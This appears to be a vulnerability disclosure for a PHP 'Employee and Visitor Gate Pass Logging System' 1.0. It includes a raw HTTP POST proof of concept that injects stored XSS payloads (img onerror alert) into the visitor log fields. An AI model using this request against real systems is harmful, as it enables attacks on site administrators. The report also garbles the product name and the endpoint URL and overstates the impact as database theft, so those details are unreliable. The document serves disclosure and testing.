## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/classes/Master.php?f=log_visitor

## Description:
The Employee and Visitor Access Log System 1.0 is vulnerable to unrestricted XSS attacks via /employee_gatepass/classes/Master.php?f=log_visitor?action=delete_category, the controllable parameter is: name. This function passes the name parameter into the malicious xss attack statement. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /employee_gatepass/classes/Master.php?f=log_visitor HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 199
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/
Cookie: PHPSESSID=j89mlbd5kdrbd4onu7hbvi3fm9
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23
Priority: u=1

type=1&name=%3Cimg+src%3D1+onerror%3Dalert('xss')%3E&contact=%3Cimg+src%3D1+onerror%3Dalert('xss')%3E&address=%3Cimg+src%3D1+onerror%3Dalert('xss')%3E&purpose=%3Cimg+src%3D1+onerror%3Dalert('xss')%3E
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/6efe3dc8-5a01-451a-a882-b345c66d7a90)

The administrator logs in to the backend and accesses the Visitors Logs function point to get a pop-up window.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/f705336f-53ab-4287-a757-70d71b821a97)



